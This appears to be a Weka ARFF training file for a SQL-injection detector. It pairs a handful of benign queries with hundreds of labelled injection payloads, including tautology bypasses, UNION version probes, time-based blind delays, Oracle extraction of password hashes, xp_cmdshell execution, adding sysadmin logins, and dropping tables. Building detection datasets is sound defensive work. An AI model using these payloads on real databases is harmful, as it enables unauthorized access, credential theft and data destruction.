@relation iris-weka.filters.unsupervised.attribute.NominalToString-C1-weka.filters.unsupervised.attribute.NumericToNominal-R2

@attribute Query string
@attribute Label {1,0}

@data
'SELECT * FROM hide WHERE    NOT animal = \"outside\"',0
'SELECT * FROM include WHERE strip = \"eager\"  AND  ( flat = \"positive\" OR fighting = \"drop\" ) ',0
'SELECT * FROM guard WHERE NOT character = \"influence\"  AND NOT egg = \"something\"',0
'SELECT * FROM fill ORDER BY title',0
'SELECT * FROM pale ORDER BY limited DESC',0
'\" select * from users where id  =  1 or @#\"\",  =  1 union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\";@\"\" or 1  =  1 -- 1\"',1
'â or 3  =  3 --',1
' AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND \"i\"  =  \"i',1
'\" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\",,\"\"  =  1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 + $+\%1 union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or 1#\"\"? union select version  (    )  ,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\"  )  1\"\" or 1  =  1 -- 1\"',1
' or uid like \"\%',1
'select * from users where id  =  \"1\" <@&1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  \"1\" union select !<1,version  (    )   -- 1\"\"',1
'23 or 1  =  1; --',1
'\" select * from users where id  =  1 or <. union select 1,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or \"\"{  (  \"\"  =  1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"\%_\"\" or 1  =  1 -- 1\"',1
'select * from users where id  =  1 +   (  .  )   or 1  =  1 -- 1',1
'\" select * from users where id  =  \"1\" union select ,@@VERSION -- 1\"\"',1
'0 or 1  =  1',1
'select * from users where id  =  1 &@ or 1  =  1 -- 1',1
'\"admin\"\"  )   or \"\"1\"\"  =  \"\"1\"',1
'select * from users where id  =  1 or <   =  1 or 1  =  1 -- 1',1
'\" select * from users where id  =  1 or \"\"??\"\" or 1  =  1 -- 1\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND \"i\"  =  \"i\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND \"i\"  =  \"i\"',1
'&apos; OR',1
sqlvuln;,1
'select * from users where id  =  1 + $+\%$ or 1  =  1 -- 1',1
'select * from users where id  =  \"1\" + $+\% or 1  =  1 -- 1\"',1
'\"\"\" or \"\"\"\"*\"\"\"',1
'\"hi or 1  =  1 --\"\"\"',1
'\" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1\"',1
'; exec master..xp_cmdshell \"ping 172.10.1.255\"--',1
'\" select * from users where id  =  \"1\" or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1\"\"',1
'\" select * from users where id  =  \"1\" union select \"\"?\"\"_,version  (    )   -- 1\"\"',1
'select * from information_schema.tables--',1
'select * from users where id  =  1 or <. or 1  =  1 -- 1',1
'   (  select top 1',1
'Ã½ or 1  =  1 --',1
'a\" --',1
' or 1  =  1 /*',1
'\" select * from users where id  =  1 or 1#\"\", union select null,version  (    )   -- 1\"',1
'\" select * from users where id  =  \"1\" union select $ .,@@VERSION -- 1\"\"',1
--,1
'\"exec sp_addlogin \"name\" , \"password\"\"',1
'\" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1\"',1
'0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ',1
'\" select * from users where id  =  1 or \"\".  )  \"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1\"',1
'group by userid having 1  =  1--',1
'\" select * from users where id  =  1 + +\%1 union select null,@@VERSION -- 1\"',1
'select * from users where id  =  1 *1 or 1  =  1 -- 1',1
'\" select * from users where id  =  1 or @#\"\";  =  1 or 1  =  1 -- 1\"',1
'�?or 1  =  1 --',1
'\" select * from users where id  =  1 *. union select null,@@VERSION -- 1\"',1
'select * from users where id  =  1 \%  (  @  )   or 1  =  1 -- 1',1
'or \"a\"  =  \"a',1
'declare @s varchar  (  22  )   select @s   = ',1
'\" select * from users where id  =  1 union select 1<@,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 + +* union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or 1#\"\". union select version  (    )  ,version  (    )   -- 1\"',1
@variable,1
'; exec master..xp_cmdshell',1
'select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1',1
'\" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  \"1\" or   (  .  )    =  1 union select 1,@@VERSION -- 1\"\"',1
' and 1 in   (  select var from temp  )  --',1
'\" select * from users where id  =  \"1\" union select 1\"\"!\"\",banner from v$version where rownum  =  1 -- 1\"\"',1
'\" select * from users where id  =  1 or \"\"1]\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"$?\"\" or 1  =  1 -- 1\"',1
'or x  =  x',1
'or a  =  a',1
'or \"1\"  =  \"1',1
'\" select * from users where id  =  11<1# union select 1,version  (    )   -- 1\"',1
'   )    )    or    (    (   \"x\"   )    )     =     (    (   \"x',1
'\" select * from users where id  =  \"1\" or .<1 union select 1,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  \"1\" <@&1 union select 1,version  (    )   -- 1\"\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND \"i\"  =  \"i\"',1
'; if is_srvrolemember  (  \"sysadmin\"  )   > 0 waitfor delay \"0:0:2\" --',1
'select * from users where id  =  1 <@<@ or 1  =  1 -- 1',1
'\" select * from users where id  =  1 union select @<@$,version  (    )   -- 1\"',1
'\" select * from users where id  =  \"1\" <@<@ union select 1,version  (    )   -- 1\"\"',1
'\" select * from users where id  =  1 or \"\"$_\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or 1#\"\"{ union select version  (    )  ,version  (    )   -- 1\"',1
'a\" or 1  =  1--',1
' )   or   (  a  =  a',1
'\"\"\"   )    )    or    (    (   \"\"x\"\"   )    )     =     (    (   \"\"x\"',1
'\" select * from users where id  =  1 or 1#\"\"; or 1  =  1 -- 1\"',1
'\" select * from users where id  =  \"1\" <@$_ union select 1,version  (    )   -- 1\"\"',1
'-- &password  = ',1
'select * from users where id  =  1 <@. or 1  =  1 -- 1',1
'\" select * from users where id  =  1 or \"\"  (    )  \"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 \%$ 1 union select null,@@VERSION -- 1\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND \"i\"  =  \"i\"',1
' or \"1\"  =  \"1',1
'admin\" or 1  =  1',1
'\" select * from users where id  =  1 or \"\";,\"\"  =  1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 union select @||1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 ++. union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or \"\"  )  ,\"\" or 1  =  1 -- 1\"',1
'\" union select * from users where login   =   char  (  114,111,111,116  )  ;\"',1
'\" select * from users where id  =  1 or 1#\"\"? union select 1,version  (    )   -- 1\"',1
' or 1  =  1--',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND \"i\"  =  \"i\"',1
'pg_sleep  (  __TIME__  )  --',1
'�?or 3  =  3 --',1
'\" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\"$#\"\" or 1  =  1 -- 1\"',1
' )   union select * from information_schema.tables;',1
'\" select * from users where id  =  1 or \"\"  )  ]\"\" or 1  =  1 -- 1\"',1
'\"  )   or benchmark  (  10000000,MD5  (  1   )    )   #\"',1
' AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND \"i\"  =  \"i',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND \"i\"  =  \"i\"',1
'\"\"\" or \"\"\"\" \"\"\"',1
delete,1
';waitfor delay \"0:0:__TIME__\"--',1
' or 1  =  1 --',1
'1\" and non_existant_table   =   \"1',1
'\" select * from users where id  =  1 or \"\"&  )  \"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  \"1\" + $ . union select 1,@@VERSION -- 1\"\"',1
'declare @s varchar  (  200  )   select @s   =   0x77616974 ...',1
'x\" AND userid IS NULL; --',1
'\" select * from users where id  =  1 or \"\";[\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  \"1\" or .<   =  1 union select 1,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  1 union select @<@,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1\"',1
' AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND \"i\"  =  \"i',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND \"i\"  =  \"i\"',1
'select * from users where id  =  1 +   (  +  )   or 1  =  1 -- 1',1
'\" select * from users where id  =  1 or \"\".[\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"  (  [\"\" or 1  =  1 -- 1\"',1
'UNION ALL SELECT',1
'\" select * from users where id  =  1 or \"\"1#\"\" or 1  =  1 -- 1\"',1
'select * from users where id  =  1 or <1 or 1  =  1 -- 1',1
'\" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1\"',1
'x\" or full_name like \"\%bob\%',1
'x\" and members.email is NULL; --',1
' or 2 > 1',1
'select * from users where id  =  1.*1 or 1  =  1 -- 1',1
'\"\"\"  )   or pg_sleep  (  __TIME__  )  --\"',1
' \"',1
'\" select * from users where id  =  1 or $<. union select 1,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or \"\"@  )  \"\" or 1  =  1 -- 1\"',1
'select * from users where id  =  1 or .<$ or 1  =  1 -- 1',1
' )   or sleep  (  __TIME__  )    =  \"',1
'sleep 50\"',1
'\" select * from users where id  =  \"1\" + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1\"\"',1
'select * from users where id  =  1 + $+\% or 1  =  1 -- 1',1
'\" select * from users where id  =  1 or \"\";  (  \"\" or 1  =  1 -- 1\"',1
'or sleep  (  __TIME__  )    =  \"',1
'\" select * from users where id  =  1 or \"\";_\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or 1#\"\". union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 union select  @ $,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 union select +!<@,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1\"',1
'or 2 > 1',1
'; exec   (  \"sel\" + \"ect us\" + \"er\"  ) ',1
'anything\" OR \"x\"  =  \"x',1
'\" select * from users where id  =  1 or < union select 1,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1\"',1
'\" select * from users where id  =  1 *  (    )   union select null,@@VERSION -- 1\"',1
'&\"',1
'a\" or 3  =  3--',1
'\" select * from users where id  =  \"1\" or $+<$ union select 1,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1\"',1
'\"admin\"\"or 1  =  1 or \"\"\"\"  =  \"\"\"',1
'uni/**/on sel/**/ect',1
'\"\"\" or \"\"\"\"&\"\"\"',1
' )    )   ;waitfor delay \"0:0:__TIME__\"--',1
'\" select * from users where id  =  1 or \"\"?;\"\" or 1  =  1 -- 1\"',1
'1 waitfor delay \"0:0:10\"--',1
bfilename,1
'admin\"  )   or   (  \"1\"  =  \"1\"--',1
UEf,1
' -- &password  = ',1
'1 or sleep  (  __TIME__  )  #',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  \"1\" union select $[\"\"],@@VERSION -- 1\"\"',1
'\" select * from users where id  =  \"1\" + @  (  1  )   union select 1,version  (    )   -- 1\"\"',1
'1\" and 1  =    (  select count  (  *  )   from tablenames  )  ; --',1
'or sleep  (  __TIME__  )  #',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 or 1#\"\",  =  1 or 1  =  1 -- 1\"',1
||6,1
'or 1/*',1
'\" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;\"',1
'select * from users where id  =  1.\%@ or 1  =  1 -- 1',1
'\" select * from users where id  =  1 or \"\"..\"\"  =  1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\";]\"\" or 1  =  1 -- 1\"',1
'\" or 1  =  1 or \"\"\"\"  =  \"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND \"i\"  =  \"i\"',1
'select * from users where id  =  1 or $<. or 1  =  1 -- 1',1
'\" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1\"',1
'or \"whatever\" in   (  \"whatever\"  ) ',1
'declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ',1
'select * from users where id  =  \"1\"   or 1  =  1 -- 1\"',1
?,1
' AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND \"i\"  =  \"i',1
'\" select * from users where id  =  \"1\" union select @ 1,version  (    )   --  1\"\"',1
'\"admin\"\"  )   or   (  \"\"1\"\"  =  \"\"1\"\"#\"',1
'\" select * from users where id  =  1 or 1#\"\", union select \"a\",version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\"$  (  \"\" or 1  =  1 -- 1\"',1
' or \"\" \"',1
'\" select * from users where id  =  1 or \"\";#\"\" or 1  =  1 -- 1\"',1
'or 1  =  1',1
' ; drop table temp --',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND \"i\"  =  \"i\"',1
'\"\"\" or benchmark  (  10000000,MD5  (  1   )    )   #\"',1
'\"\"\" or \"\"x\"\"  =  \"\"x\"',1
'select * from users where id  =  \"1\"<@.. or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1\"',1
' or \"something\" like \"some\%\"',1
'; if not   (    (   select serverproperty  (  \"isintegratedsecurityonly\"   )    )    <> 0  )   waitfor delay \"0:0:2\" --',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND \"i\"  =  \"i\"',1
'select * from users where id  =  \"1\" or <. or 1  =  1 -- 1\"',1
'; exec master..xp_cmdshell \"ping 10.10.1.2\"--',1
'admin\" or \"1\"  =  \"1\"--',1
'; if not   (    (   select serverproperty  (  \"isintegratedsecurityonly\"   )    )    <> 1  )   waitfor delay \"0:0:2\" --',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or 1#\"\"$ union select null,version  (    )   -- 1\"',1
'\"\"\";waitfor delay \"0:0:__TIME__\"--\"',1
'x\" and userid is NULL; --',1
'select * from users where id  =  \"1\" *$ 1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or < union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or \"\"?@\"\" or 1  =  1 -- 1\"',1
'�?or �?�? =  �?',1
'\" select * from users where id  =  \"1\" union select 1a,banner from v$version where rownum  =  1 -- 1\"\"',1
'admin\"or 1  =  1 or \"\"  =  \"',1
'\" select * from users where id  =  \"1\" or !<1 union select 1,version  (    )   -- 1\"\"',1
'\" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...\"',1
'exec  (  @s  ) ',1
'\" select * from users where id  =  1 or \"\"_  )  \"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or .<   =  1 union select 1,@@VERSION -- 1\"',1
' or 1  =  1',1
'select * from users where id  =  1 + $+\%1 or 1  =  1 -- 1',1
'\" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1\"',1
'x\" AND email IS NULL; --',1
'\" select * from users where id  =  \"1\" + @ @1 union select 1,version  (    )   -- 1\"\"',1
' --',1
'\" select * from users where id  =  \"1\"   union select null,banner from v$version where rownum  =  1 -- 1\"\"',1
'\" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1\"',1
'\" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1\"',1
update,1
' or 1/*',1
'\" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1\"',1
'\"\"\"   )    )    or pg_sleep  (  __TIME__  )  --\"',1
'||\"6',1
'\" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1\"',1
'or   (  EXISTS  ) ',1
'^\"',1
'or \"text\"   =   n\"text\"',1
'\" select * from users where id  =  1 + +*$ union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  \"1\" union select $ _,@@VERSION -- 1\"\"',1
'\" select * from users where id  =  1 or \"\"  )  ;\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1\"',1
' or 0  =  0 --',1
'\" select * from users where id  =  1 or \"\"{1\"\"  =  1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or \"\"{,\"\"  =  1 or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or 1#\"\", union select version  (    )  ,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or 1#\"\"? union select \"a\",version  (    )   -- 1\"',1
'password:*/  =  1--',1
'\" select * from users where id  =  1 <@. union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\"  )  @\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  \"1\" union select @ @1,version  (    )   --  1\"\"',1
'\" union   (  select NULL,   (  select @@version   )    )    --\"',1
'\" select * from users where id  =  1 or \"\"  )  {\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 +. union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or <$ union select 1,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 +   (  +  )   union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  1. union select null,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\"  )  [\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or .<1 union select 1,@@VERSION -- 1\"',1
' AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND \"i\"  =  \"i',1
'select * from users where id  =  1 <@$_ or 1  =  1 -- 1',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND \"i\"  =  \"i\"',1
'\" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or \"\"@\%\"\" or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 or $< union select 1,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or \"\"\%,\"\" or 1  =  1 -- 1\"',1
'UNION SELECT',1
asc,1
'\" || myappadmin.adduser  (  \"admin\", \"newpass\"  )   || \"\"',1
'\"exec sp_addsrvrolemember \"name\" , \"sysadmin\"\"',1
'\" select * from users where id  =  1 or   (    )    =  1 union select 1,@@VERSION -- 1\"',1
'  )   or true--',1
'\" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1\"',1
'\" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND \"i\"  =  \"i\"',1
' or userid like \"\%',1
'\" union   (  select NULL, NULL,   (  select @@version   )    )    --\"',1
/,1
'select * from users where id  =  1 or $< or 1  =  1 -- 1',1
'\"admin\"\"/*\"',1
'\" select * from users where id  =  1.  union select 1,version  (    )   -- 1\"',1
' )  ;waitfor delay \"0:0:__TIME__\"--',1
'\" select * from users where id  =  1 union select @<@.,version  (    )   -- 1\"',1
'\" select * from users where id  =  1 or \"\"._\"\" or 1  =  1 -- 1\"',1
'\"admin\"\" or \"\"1\"\"  =  \"\"1\"',1
' union   (  select @@version  )   --',1
' or \"\"^\"',1
'\"\"\"   )    )    or sleep  (  __TIME__  )    =  \"\"\"',1
'\" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --\"',1
'\" select * from users where id  =  1 or +< union select 1,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 union select @ _,version  (    )   -- 1\"',1
'select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1',1
'select * from users where id  =  \"1\" <@$_ or 1  =  1 -- 1\"',1
'\" select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1\"',1
'\" select * from users where id  =  1 or \"\"  (  &\"\" or 1  =  1 -- 1\"',1
'\"\"\"hi\"\"\"\"  )   or   (  \"\"\"\"a\"\"\"\"  =  \"\"\"\"a\"\"\"',1
'select name from syscolumns where id   =     (  sele ...',1
'\" select * from users where id  =  1 or \"\"1,\"\" or 1  =  1 -- 1\"',1
